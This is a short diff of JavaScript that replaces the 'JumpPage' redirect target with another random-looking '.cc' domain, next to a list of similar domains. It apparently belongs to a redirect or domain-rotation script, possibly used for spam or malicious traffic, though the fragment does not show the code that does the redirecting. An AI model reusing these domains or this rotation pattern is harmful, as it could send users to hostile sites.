@@ -42,7 +42,7 @@ var urls=[
 	'ftpglvcn.cc',
 ];                                                                                                                  
 
-var JumpPage="http://jqjeysvtj.cc";
+var JumpPage="http://tuahoskwk.cc";
 
 var newestUrls = [];
 
